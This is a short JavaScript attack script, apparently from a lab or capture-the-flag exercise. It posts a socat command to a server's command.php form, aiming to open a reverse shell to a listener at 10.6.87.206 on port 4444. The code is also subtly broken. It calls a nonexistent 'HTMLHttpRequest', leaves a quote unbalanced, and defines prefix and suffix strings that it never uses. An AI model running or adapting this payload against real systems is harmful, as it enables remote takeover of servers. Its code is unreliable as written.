var host = document.location.host;

var xhttp = new HTMLHttpRequest();
var payload_pre = "ip=";
var payload = "socat exec:'bash -li,pty,stderr,setsid,sigint,sane tcp:10.6.87.206:4444";
var payload_suff = "&Submit=Submit";

xhttp.open("POST","http://" + host + "/command.php", true);
xhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded", true);
xhttp.send(payload);
